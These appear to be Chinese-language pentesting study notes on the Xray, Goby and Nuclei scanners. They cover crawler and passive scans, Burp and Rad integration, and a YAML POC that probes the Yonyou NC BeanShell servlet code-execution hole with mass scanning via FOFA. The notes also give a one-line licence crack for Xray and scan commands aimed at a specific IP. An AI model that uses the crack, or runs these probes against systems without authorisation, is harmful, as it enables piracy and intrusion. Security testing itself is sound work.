## Xray
https://github.com/chaitin/xray
https://docs.xray.cool/#
- 不是开源，但是可以在github上下载编译好的程序包
- 检测速度快, 支持范围广, 代码质量高, 高级可定制, 安全无威胁

### XRAY破解
使用二进制编辑器打开xray, 修改`COMMUNITY`中的任意一个字符

### 爬虫模式
```shell
#完整
xray.exe webscan --basic-crawler http://testphp.vulnweb.com --html-output vulnweb.com-1.html

#简化
xray.exe ws --basic http://testphp.vulnweb.com/ --ho vulnweb.com-2.html
```

### 被动扫描
1. 生成ca证书 `xray.exe genca`
2. 开启监听 `xray.exe ws --listen 127.0.0.1:8031 --ho testphp.html`
3. 浏览器代理设置, 到监听的端口

### BP联动
1. BurpSuite: `User options`-->`Upstream Proxy Servers`-->`Add`, 添加监听的端口
2. XRAY: 开启对应端口的监听

### Rad联动
https://github.com/chaitin/rad/releases
```shell
# 手动登录, 开启一个浏览器供手动登录
rad -t https://www.hetianlab.com/ -wait-login
# 将爬取结果导出为文件
rad -t https://ww.hetianlab.com/  -text-output result.txt
# 与xray联动
xray.exe ws --listen 127.0.0.1:8031 --ho proxy.html
rad -t http://120.27.61.239:8007 --http-proxy 127.0.0.1:8031
# xray高级版，融合
xray ws --browser-crawler http://120.27.61.239:8007 --ho vuln.html
```

### POC脚本编写
https://stack.chaitin.com/techblog/detail?id=50
- 编写辅助工具: https://poc.xray.cool
- C:\windows\win.ini
- https://regex101.com
- 配合fofa, 扫描用友nc的servlet漏洞
	- `/servlet/~ic/bsh.servlet.BshServlet`
	- POST["bsh.script"]
	- https://cloud.tencent.com/developer/article/1839237
```yml
name: poc-yaml-用友NC-bsh.servlet.BshServlet
transport: http
set:
  r3: randomInt(5000, 6000)
rules:
  r0:
    request:
      method: GET
      path: /servlet/~ic/bsh.servlet.BshServlet
      follow_redirects: false
    expression: response.status == 200 && response.body.bcontains(bytes(string('BeanShell')))
  r1:
    request:
      cache: true
      method: POST
      path: /servlet/~ic/bsh.servlet.BshServlet
      follow_redirects: false
      headers:
        Content-Type: application/x-www-form-urlencoded
      body: bsh.script=print%28%22{{r3}}%22%29%3B
    expression: response.status == 200 && response.body.bcontains(bytes(string(r3)))
expression: r0() && r1()
detail:
  author: test
  links:
    - http://test.test
```
```shell
# 执行检测
xray ws -p mypocs/poc-yaml-用友NC-bsh.servlet.BshServlet.yml -uf url.txt --ho yongyou-nc.html
```

## Goby
可视化图形界面, 由Zwell打造. 探测网络空间存活IP及解析域名, 端口对应的协议, Mac地址, 证书, 应用产品, 厂商等信息. 自动爬取子域名, ACFR检测, 二级域名字典爆破, 关联域名查询. 支持连接FOFA, 插件打开xray, 截图判断网站系统应用. 首先下载Npcap数据捕获包, 安装完成后启动goby
- 官网下载: https://www.gobies.cn/#dl
- 注册地址: https://www.gobies.cn/signUp
- 临时邮箱: https://tempail.com/en/

## Nuclei
https://github.com/projectdiscovery/nuclei
基于YAML的DSL的快速可定制的漏洞扫描器
- 支持协议: TCP, DNS, HTTP, SSL, File, Whois, Websocket, Headless等
- 文档: https://nuclei.projectdiscovery.io/nuclei/get-started
- 模板: https://github.com/projectdiscovery/nuclei-tamplates
	- 更新漏洞模板 `nuclei -update-templates`